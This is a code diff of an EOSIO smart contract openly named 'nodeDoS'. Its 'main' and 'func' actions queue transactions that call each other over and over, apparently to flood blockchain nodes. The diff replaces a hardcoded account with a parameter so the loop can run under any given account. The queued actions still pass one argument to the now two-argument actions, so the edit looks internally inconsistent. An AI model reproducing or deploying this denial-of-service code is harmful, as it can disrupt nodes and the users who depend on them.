@@ -13,13 +13,13 @@ class [[eosio::contract]] nodeDoS : public eosio::contract {
   public:
       using contract::contract;
         [[eosio::action]]
-        void main(uint64_t idx)
+        void main(name client, uint64_t idx)
         {
             uint128_t initnum = 1;
             transaction out1{};
             transaction out2{};
 
-            name client = name("reset");
+            //name client = name("reset");
 
             out1.actions.emplace_back(permission_level{client, "active"_n}, client, "func"_n,std::make_tuple( uint64_t(1)) );
             out2.actions.emplace_back(permission_level{client, "active"_n}, client, "func"_n,std::make_tuple( uint64_t(2)) );
@@ -40,9 +40,9 @@ class [[eosio::contract]] nodeDoS : public eosio::contract {
             print("[#] MAIN: ", idx);
         };
         [[eosio::action]]
-        void func(uint64_t idx)
+        void func(name client, uint64_t idx)
         { // 123 567
-            name client = name("reset");
+            //name client = name("reset");
             transaction out{};
             out.actions.emplace_back(permission_level{client, "active"_n}, client, "main"_n, std::make_tuple( uint64_t(idx*100) ));
             //out.delay_sec = 0;
